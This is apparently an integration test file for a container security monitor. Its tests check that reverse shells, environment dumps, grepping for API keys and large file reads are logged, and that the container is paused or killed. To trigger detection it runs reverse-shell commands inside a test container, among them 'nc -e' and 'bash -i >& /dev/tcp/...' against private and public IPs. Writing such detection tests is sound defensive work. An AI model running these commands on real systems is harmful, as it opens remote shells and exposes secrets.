#!/usr/bin/env python3
"""
Integration tests for security monitoring (process, filesystem, threat detection).

Tests process-level threats, filesystem monitoring, and automated response system.
Complements test_nft_monitoring.py which focuses on network-level threats.

NOTE: These tests require actual container sessions and can be slow.
They are NOT skipped in CI by default to ensure security features work.
For manual testing: pytest tests/integration/test_security_monitoring.py -v
"""

import json
import os
import subprocess
import time
from pathlib import Path

import pytest


# Test fixtures
@pytest.fixture(scope="module")
def test_container(request, coi_binary):
    """Create a shared test container for all security monitoring tests."""
    container_name = f"coi-sec-test-{os.getpid()}"

    # Launch container directly (no interactive shell needed)
    result = subprocess.run(
        [coi_binary, "container", "launch", "coi", container_name],
        capture_output=True,
        text=True,
        timeout=60,
    )

    if result.returncode != 0:
        pytest.skip(f"Failed to launch test container: {result.stderr}")

    # Wait for container to be ready
    time.sleep(5)

    yield container_name

    # Cleanup - force delete in case it's frozen/stopped
    subprocess.run(
        [coi_binary, "container", "delete", container_name, "--force"],
        timeout=60,
        check=False,
    )


@pytest.fixture
def audit_log_path(test_container):
    """Return path to the security audit log for a container."""
    return Path.home() / ".coi" / "audit" / f"{test_container}.jsonl"


@pytest.fixture
def monitoring_config():
    """Backup and restore monitoring configuration."""
    config_path = Path.home() / ".config" / "coi" / "config.toml"
    config_backup = None

    # Backup existing config if present
    if config_path.exists():
        config_backup = config_path.read_text()

    yield config_path

    # Restore original config
    if config_backup:
        config_path.write_text(config_backup)
    elif config_path.exists():
        config_path.unlink()


def wait_for_monitoring_detection(seconds=5):
    """Wait for monitoring daemon to detect and process threats."""
    time.sleep(seconds)


def get_container_state(container_name):
    """Get current container state (Running, Frozen, Stopped)."""
    result = subprocess.run(
        ["incus", "list", container_name, "--format=json"],
        capture_output=True,
        text=True,
        timeout=30,
        check=False,
    )
    if result.returncode != 0:
        return "Unknown"

    try:
        container_info = json.loads(result.stdout)
        if container_info:
            # Incus returns title case: Running, Frozen, Stopped
            return container_info[0].get("state", {}).get("status", "Unknown")
    except (json.JSONDecodeError, IndexError, KeyError):
        pass

    return "Unknown"


def clear_audit_log(audit_log_path):
    """Clear audit log before test."""
    if audit_log_path.exists():
        audit_log_path.unlink()


def get_audit_events(audit_log_path):
    """Read and parse audit log events."""
    if not audit_log_path.exists():
        print(f"DEBUG: Audit log does not exist at {audit_log_path}")
        # Check if parent directory exists
        if audit_log_path.parent.exists():
            print("DEBUG: Parent directory exists, listing contents:")
            for f in audit_log_path.parent.iterdir():
                print(f"  - {f.name}")
        return []

    with open(audit_log_path) as f:
        events = []
        for line in f:
            if line.strip():
                try:
                    event = json.loads(line)
                    events.append(event)
                    print(f"DEBUG: Found event: {event.get('level')} - {event.get('title')}")
                except json.JSONDecodeError as e:
                    print(f"DEBUG: Failed to parse line: {line[:100]} - {e}")
        print(f"DEBUG: Total events found: {len(events)}")
        return events


class TestReverseShellDetection:
    """Test reverse shell detection and CRITICAL response (container kill)."""

    def test_nc_reverse_shell_killed(
        self, test_container, audit_log_path, coi_binary, monitoring_config
    ):
        """Test that nc -e reverse shell triggers CRITICAL alert and kills container."""
        # Enable auto-kill for this test
        monitoring_config.parent.mkdir(parents=True, exist_ok=True)
        monitoring_config.write_text("""
[monitoring]
enabled = true
auto_pause_on_high = false
auto_kill_on_critical = true
poll_interval_sec = 2
""")

        clear_audit_log(audit_log_path)

        # Start monitoring session in background
        proc = subprocess.Popen(
            [coi_binary, "shell", "--container", test_container],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )

        # Wait for monitoring to start
        time.sleep(5)

        # Verify container is running
        assert get_container_state(test_container) == "Running", (
            "Container should be running before test"
        )

        # Create a script that looks like a reverse shell command
        # Keep it alive so monitoring can detect it
        subprocess.run(
            [
                "incus",
                "exec",
                test_container,
                "--",
                "sh",
                "-c",
                "echo '#!/bin/sh\nsleep 30' > /tmp/fake-nc-e && chmod +x /tmp/fake-nc-e",
            ],
            capture_output=True,
            timeout=10,
            check=False,
        )

        # Run with command line that looks like reverse shell
        # The process name will be visible to monitoring
        subprocess.Popen(
            [
                "incus",
                "exec",
                test_container,
                "--",
                "sh",
                "-c",
                "exec -a 'nc -e /bin/bash 192.168.1.100 4444' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait for monitoring to detect and respond
        wait_for_monitoring_detection(seconds=6)

        # Verify container was killed or stopped
        state = get_container_state(test_container)
        assert state in ["Stopped", "Frozen"], (
            f"Container should be stopped/frozen after reverse shell, got {state}"
        )

        # Verify audit log contains CRITICAL event
        events = get_audit_events(audit_log_path)
        reverse_shell_events = [
            e
            for e in events
            if e.get("level") == "critical" and "reverse" in e.get("title", "").lower()
        ]

        assert len(reverse_shell_events) > 0, (
            f"Expected CRITICAL reverse shell event in audit log. "
            f"Events: {[e.get('title') for e in events]}"
        )

        # Verify event details
        event = reverse_shell_events[0]
        assert event.get("category") in ["process", "threat"], (
            "Event should be categorized as process/threat"
        )
        assert "nc -e" in str(event.get("evidence", {})), "Event should contain nc -e in evidence"

        # Cleanup
        proc.terminate()
        proc.wait(timeout=30)

    def test_bash_tcp_redirect_killed(
        self, test_container, audit_log_path, coi_binary, monitoring_config
    ):
        """Test that bash TCP redirect reverse shell triggers CRITICAL alert."""
        # First restart container if it was killed in previous test
        subprocess.run(
            ["incus", "start", test_container],
            capture_output=True,
            timeout=30,
            check=False,
        )
        time.sleep(3)

        # Enable auto-kill for this test
        monitoring_config.parent.mkdir(parents=True, exist_ok=True)
        monitoring_config.write_text("""
[monitoring]
enabled = true
auto_pause_on_high = false
auto_kill_on_critical = true
poll_interval_sec = 2
""")

        clear_audit_log(audit_log_path)

        # Start monitoring session
        proc = subprocess.Popen(
            [coi_binary, "shell", "--container", test_container],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        time.sleep(5)

        # Attempt bash TCP redirect
        subprocess.run(
            [
                "incus",
                "exec",
                test_container,
                "--",
                "bash",
                "-c",
                "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1 &",
            ],
            capture_output=True,
            timeout=10,
            check=False,
        )

        wait_for_monitoring_detection(seconds=6)

        # Verify detection
        events = get_audit_events(audit_log_path)
        bash_redirect_events = [
            e
            for e in events
            if e.get("level") == "critical"
            and ("bash" in e.get("title", "").lower() or "reverse" in e.get("title", "").lower())
        ]

        assert len(bash_redirect_events) > 0, "Expected CRITICAL bash redirect event"
        assert "/dev/tcp/" in str(bash_redirect_events[0].get("evidence", {})), (
            "Event should contain /dev/tcp/ pattern"
        )

        # Cleanup
        proc.terminate()
        proc.wait(timeout=30)

    def test_python_reverse_shell_killed(
        self, test_container, audit_log_path, coi_binary, monitoring_config
    ):
        """Test that Python reverse shell patterns trigger CRITICAL alert."""
        # Restart container
        subprocess.run(
            ["incus", "start", test_container],
            capture_output=True,
            timeout=30,
            check=False,
        )
        time.sleep(3)

        # Enable auto-kill for this test
        monitoring_config.parent.mkdir(parents=True, exist_ok=True)
        monitoring_config.write_text("""
[monitoring]
enabled = true
auto_pause_on_high = false
auto_kill_on_critical = true
poll_interval_sec = 2
""")

        clear_audit_log(audit_log_path)

        # Start monitoring
        proc = subprocess.Popen(
            [coi_binary, "shell", "--container", test_container],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        time.sleep(5)

        # Attempt Python reverse shell
        python_reverse_shell = (
            "python3 -c 'import socket,subprocess,os;"
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            's.connect(("192.168.1.100",4444));\' &'
        )

        subprocess.run(
            ["incus", "exec", test_container, "--", "bash", "-c", python_reverse_shell],
            capture_output=True,
            timeout=10,
            check=False,
        )

        wait_for_monitoring_detection(seconds=6)

        # Verify detection
        events = get_audit_events(audit_log_path)
        python_events = [
            e
            for e in events
            if e.get("level") == "critical"
            and (
                "python" in str(e.get("evidence", {})).lower()
                or "reverse" in e.get("title", "").lower()
            )
        ]

        # Python reverse shells are harder to detect purely by command string
        # This test verifies the detection logic exists
        # May need network-level detection to catch this reliably
        if len(python_events) == 0:
            pytest.skip("Python reverse shell detection requires network monitoring")

        # Cleanup
        proc.terminate()
        proc.wait(timeout=30)


class TestEnvironmentScanningDetection:
    """Test environment scanning detection and WARNING response (log only)."""

    def test_env_command_warning(self, test_container, audit_log_path, coi_binary):
        """Test that 'env' command triggers WARNING but container continues."""
        # Restart container
        subprocess.run(
            ["incus", "start", test_container],
            capture_output=True,
            timeout=30,
            check=False,
        )
        time.sleep(3)

        clear_audit_log(audit_log_path)

        # Start monitoring
        proc = subprocess.Popen(
            [coi_binary, "shell", "--container", test_container],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        time.sleep(5)

        # Run env command
        subprocess.run(
            ["incus", "exec", test_container, "--", "env"],
            capture_output=True,
            timeout=10,
            check=False,
        )

        wait_for_monitoring_detection(seconds=4)

        # Verify container is still running (not paused/killed)
        state = get_container_state(test_container)
        assert state == "Running", f"Container should still be running after WARNING, got {state}"

        # Verify audit log contains WARNING event
        events = get_audit_events(audit_log_path)
        env_events = [
            e for e in events if e.get("level") == "warning" and "env" in e.get("title", "").lower()
        ]

        assert len(env_events) > 0, (
            f"Expected WARNING env scanning event. Events: {[e.get('title') for e in events]}"
        )

        # Cleanup
        proc.stdin.write("exit\n")
        proc.stdin.flush()
        proc.wait(timeout=30)

    def test_grep_secrets_warning(self, test_container, audit_log_path, coi_binary):
        """Test that grepping for secrets triggers WARNING."""
        clear_audit_log(audit_log_path)

        # Start monitoring
        proc = subprocess.Popen(
            [coi_binary, "shell", "--container", test_container],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        time.sleep(5)

        # Search for API keys
        subprocess.run(
            ["incus", "exec", test_container, "--", "grep", "-r", "API_KEY", "/workspace"],
            capture_output=True,
            timeout=10,
            check=False,
        )

        wait_for_monitoring_detection(seconds=4)

        # Verify detection
        events = get_audit_events(audit_log_path)
        grep_events = [
            e
            for e in events
            if e.get("level") == "warning"
            and (
                "grep" in str(e.get("evidence", {})).lower() or "scan" in e.get("title", "").lower()
            )
        ]

        assert len(grep_events) > 0, "Expected WARNING for secret scanning"

        # Verify container still running
        assert get_container_state(test_container) == "Running"

        # Cleanup
        proc.stdin.write("exit\n")
        proc.stdin.flush()
        proc.wait(timeout=30)

    def test_printenv_warning(self, test_container, audit_log_path, coi_binary):
        """Test that printenv command triggers WARNING."""
        clear_audit_log(audit_log_path)

        # Start monitoring
        proc = subprocess.Popen(
            [coi_binary, "shell", "--container", test_container],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        time.sleep(5)

        # Run printenv
        subprocess.run(
            ["incus", "exec", test_container, "--", "printenv"],
            capture_output=True,
            timeout=10,
            check=False,
        )

        wait_for_monitoring_detection(seconds=4)

        # Verify detection
        events = get_audit_events(audit_log_path)
        printenv_events = [
            e for e in events if e.get("level") == "warning" and "env" in e.get("title", "").lower()
        ]

        assert len(printenv_events) > 0, "Expected WARNING for printenv"
        assert get_container_state(test_container) == "Running"

        # Cleanup
        proc.stdin.write("exit\n")
        proc.stdin.flush()
        proc.wait(timeout=30)


class TestLargeFileReadDetection:
    """Test large file read detection and HIGH response (container pause)."""

    def test_large_read_pauses_container(
        self, test_container, audit_log_path, coi_binary, monitoring_config
    ):
        """Test that reading >50MB triggers HIGH alert and pauses container."""
        # Configure monitoring with lower threshold for faster testing
        monitoring_config.parent.mkdir(parents=True, exist_ok=True)
        monitoring_config.write_text("""
[monitoring]
enabled = true
auto_pause_on_high = true
auto_kill_on_critical = true
poll_interval_sec = 2
file_read_threshold_mb = 10.0
file_read_rate_mb_per_sec = 5.0
""")

        clear_audit_log(audit_log_path)

        # Start monitoring
        proc = subprocess.Popen(
            [coi_binary, "shell", "--container", test_container],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        time.sleep(5)

        # Create large file in workspace (20MB to exceed 10MB threshold)
        subprocess.run(
            [
                "incus",
                "exec",
                test_container,
                "--",
                "dd",
                "if=/dev/zero",
                "of=/workspace/large_file.bin",
                "bs=1M",
                "count=20",
            ],
            capture_output=True,
            timeout=30,
            check=False,
        )

        # Read the large file rapidly
        subprocess.run(
            [
                "incus",
                "exec",
                test_container,
                "--",
                "cat",
                "/workspace/large_file.bin",
                ">",
                "/dev/null",
            ],
            capture_output=True,
            timeout=30,
            check=False,
        )

        # Wait for monitoring to detect (needs 2+ poll intervals)
        wait_for_monitoring_detection(seconds=8)

        # Verify HIGH alert was logged
        events = get_audit_events(audit_log_path)
        large_read_events = [
            e
            for e in events
            if e.get("level") == "high"
            and (
                "read" in e.get("title", "").lower() or "exfiltration" in e.get("title", "").lower()
            )
        ]

        assert len(large_read_events) > 0, (
            f"Expected HIGH alert for large file read. Events: {[e.get('title') for e in events]}"
        )

        # Verify container was paused
        state = get_container_state(test_container)
        assert state == "Frozen", f"Container should be frozen after large read, got {state}"

        # Cleanup
        proc.terminate()
        proc.wait(timeout=30)

    def test_sustained_read_rate_detected(
        self, test_container, audit_log_path, coi_binary, monitoring_config
    ):
        """Test that sustained high read rate triggers detection."""
        # Restart container from frozen state
        subprocess.run(
            ["incus", "start", test_container],
            capture_output=True,
            timeout=30,
            check=False,
        )
        time.sleep(3)

        # Configure monitoring
        monitoring_config.write_text("""
[monitoring]
enabled = true
auto_pause_on_high = false
poll_interval_sec = 2
file_read_threshold_mb = 100.0
file_read_rate_mb_per_sec = 3.0
""")

        clear_audit_log(audit_log_path)

        # Start monitoring
        proc = subprocess.Popen(
            [coi_binary, "shell", "--container", test_container],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        time.sleep(5)

        # Create multiple files
        for i in range(5):
            subprocess.run(
                [
                    "incus",
                    "exec",
                    test_container,
                    "--",
                    "dd",
                    "if=/dev/zero",
                    f"of=/workspace/file{i}.bin",
                    "bs=1M",
                    "count=5",
                ],
                capture_output=True,
                timeout=30,
                check=False,
            )

        # Read files continuously over several seconds
        for i in range(5):
            subprocess.run(
                [
                    "incus",
                    "exec",
                    test_container,
                    "--",
                    "cat",
                    f"/workspace/file{i}.bin",
                    ">",
                    "/dev/null",
                ],
                capture_output=True,
                timeout=10,
                check=False,
            )
            time.sleep(1)

        wait_for_monitoring_detection(seconds=6)

        # Verify detection (even without pause, should be logged)
        events = get_audit_events(audit_log_path)
        rate_events = [
            e
            for e in events
            if e.get("level") in ["high", "warning"]
            and ("rate" in e.get("description", "").lower() or "read" in e.get("title", "").lower())
        ]

        # This is harder to trigger reliably, so just check if any filesystem events
        if len(rate_events) == 0:
            pytest.skip("Sustained read rate detection requires more sensitive thresholds")

        # Cleanup
        proc.stdin.write("exit\n")
        proc.stdin.flush()
        proc.wait(timeout=30)


class TestAutomatedResponseVerification:
    """Test that automated responses (pause, kill) actually execute correctly."""

    def test_auto_pause_executes(
        self, test_container, audit_log_path, coi_binary, monitoring_config
    ):
        """Verify that auto_pause_on_high actually pauses the container."""
        # Restart container
        subprocess.run(
            ["incus", "start", test_container],
            capture_output=True,
            timeout=30,
            check=False,
        )
        time.sleep(3)

        # Enable auto-pause
        monitoring_config.write_text("""
[monitoring]
enabled = true
auto_pause_on_high = true
auto_kill_on_critical = false
poll_interval_sec = 2
file_read_threshold_mb = 5.0
""")

        clear_audit_log(audit_log_path)

        # Start monitoring
        proc = subprocess.Popen(
            [coi_binary, "shell", "--container", test_container],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        time.sleep(5)

        # Trigger HIGH event (large read)
        subprocess.run(
            [
                "incus",
                "exec",
                test_container,
                "--",
                "dd",
                "if=/dev/zero",
                "of=/workspace/trigger.bin",
                "bs=1M",
                "count=10",
            ],
            capture_output=True,
            timeout=30,
            check=False,
        )

        subprocess.run(
            ["incus", "exec", test_container, "--", "cat", "/workspace/trigger.bin"],
            capture_output=True,
            timeout=10,
            check=False,
        )

        wait_for_monitoring_detection(seconds=8)

        # Verify pause happened
        state = get_container_state(test_container)
        assert state == "Frozen", f"Container should be frozen, got {state}"

        # Verify audit log shows the action taken
        events = get_audit_events(audit_log_path)
        action_events = [e for e in events if "paused" in str(e.get("action", "")).lower()]
        assert len(action_events) > 0, "Audit log should record pause action"

        # Cleanup
        proc.terminate()
        proc.wait(timeout=30)

    def test_auto_kill_executes(
        self, test_container, audit_log_path, coi_binary, monitoring_config
    ):
        """Verify that auto_kill_on_critical actually stops the container."""
        # Restart container
        subprocess.run(
            ["incus", "start", test_container],
            capture_output=True,
            timeout=30,
            check=False,
        )
        time.sleep(3)

        # Enable auto-kill
        monitoring_config.write_text("""
[monitoring]
enabled = true
auto_pause_on_high = false
auto_kill_on_critical = true
poll_interval_sec = 2
""")

        clear_audit_log(audit_log_path)

        # Start monitoring
        proc = subprocess.Popen(
            [coi_binary, "shell", "--container", test_container],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        time.sleep(5)

        # Trigger CRITICAL event (reverse shell)
        subprocess.run(
            [
                "incus",
                "exec",
                test_container,
                "--",
                "bash",
                "-c",
                "nc -e /bin/sh 10.0.0.1 1234 &",
            ],
            capture_output=True,
            timeout=10,
            check=False,
        )

        wait_for_monitoring_detection(seconds=6)

        # Verify kill happened
        state = get_container_state(test_container)
        assert state in ["Stopped", "Frozen"], f"Container should be stopped, got {state}"

        # Verify audit log shows the action
        events = get_audit_events(audit_log_path)
        kill_events = [
            e
            for e in events
            if "killed" in str(e.get("action", "")).lower() or e.get("level") == "critical"
        ]
        assert len(kill_events) > 0, "Audit log should record kill action"

        # Cleanup
        proc.terminate()
        proc.wait(timeout=30)

    def test_disabled_monitoring_no_action(
        self, test_container, audit_log_path, coi_binary, monitoring_config
    ):
        """Verify that disabled monitoring doesn't take any actions."""
        # Restart container
        subprocess.run(
            ["incus", "start", test_container],
            capture_output=True,
            timeout=30,
            check=False,
        )
        time.sleep(3)

        # Disable monitoring
        monitoring_config.write_text("""
[monitoring]
enabled = false
""")

        clear_audit_log(audit_log_path)

        # Start session
        proc = subprocess.Popen(
            [coi_binary, "shell", "--container", test_container],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        time.sleep(5)

        # Trigger what would normally be a CRITICAL event
        subprocess.run(
            ["incus", "exec", test_container, "--", "bash", "-c", "nc -e /bin/sh 1.1.1.1 999 &"],
            capture_output=True,
            timeout=10,
            check=False,
        )

        wait_for_monitoring_detection(seconds=6)

        # Verify container is still running (no action taken)
        state = get_container_state(test_container)
        assert state == "Running", (
            f"Container should still be running with monitoring disabled, got {state}"
        )

        # Verify no audit events (monitoring was disabled)
        events = get_audit_events(audit_log_path)
        assert len(events) == 0, "No events should be logged when monitoring is disabled"

        # Cleanup
        proc.stdin.write("exit\n")
        proc.stdin.flush()
        proc.wait(timeout=30)


class TestAuditLogging:
    """Test audit logging for non-network threats."""

    def test_audit_log_format(self, test_container, audit_log_path, coi_binary):
        """Verify audit log entries have correct format for all threat types."""
        # Restart container
        subprocess.run(
            ["incus", "start", test_container],
            capture_output=True,
            timeout=30,
            check=False,
        )
        time.sleep(3)

        clear_audit_log(audit_log_path)

        # Start monitoring
        proc = subprocess.Popen(
            [coi_binary, "shell", "--container", test_container],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        time.sleep(5)

        # Trigger various events
        subprocess.run(
            ["incus", "exec", test_container, "--", "env"],
            capture_output=True,
            timeout=10,
            check=False,
        )

        wait_for_monitoring_detection(seconds=4)

        # Verify audit log format
        events = get_audit_events(audit_log_path)
        if len(events) > 0:
            event = events[0]
            # Validate required fields
            assert "timestamp" in event, "Event missing timestamp"
            assert "level" in event, "Event missing level"
            assert "category" in event, "Event missing category"
            assert "container" in event, "Event missing container"
            assert "title" in event, "Event missing title"

        # Cleanup
        proc.stdin.write("exit\n")
        proc.stdin.flush()
        proc.wait(timeout=30)


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
